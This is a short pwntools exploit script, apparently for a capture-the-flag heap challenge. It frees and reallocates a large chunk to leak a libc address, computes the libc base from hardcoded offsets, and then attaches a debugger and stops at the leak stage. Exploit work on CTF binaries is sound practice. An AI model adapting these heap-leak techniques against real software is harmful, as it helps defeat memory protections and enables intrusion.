from pwn import *

elf = ELF("./chall")
libc = elf.libc

target = process([elf.path])
#target = remote("pwn.challenge.bi0s.in", 1299)

def sla(s, d):
    target.sendlineafter(">>", d)

def add(idx, size, content):
    sla(">", "1")
    sla(">", str(idx))
    sla(">", str(size))
    sla(">", content)

def check(idx):
    sla(">", "2")
    sla(">", str(idx))

def show(idx):
    sla(">", "3")
    sla(">", str(idx))

def rem(idx):
    sla(">", "4")
    sla(">", str(idx))

add(10, 0x700, "ABCDEFGH"*1)
add(0, 0x10, " ")
rem(10)
add(10, 0x700, "")
show(10)
target.recvuntil("Path : ")
libc.address = u64(target.recv(8)) + 0x00007fb0c3935000 - 0x00007fb0c3b20b00
log.info("LIBC Base: " + hex(libc.address))

check(0)
gdb.attach(target, 'heap chunks')


target.interactive()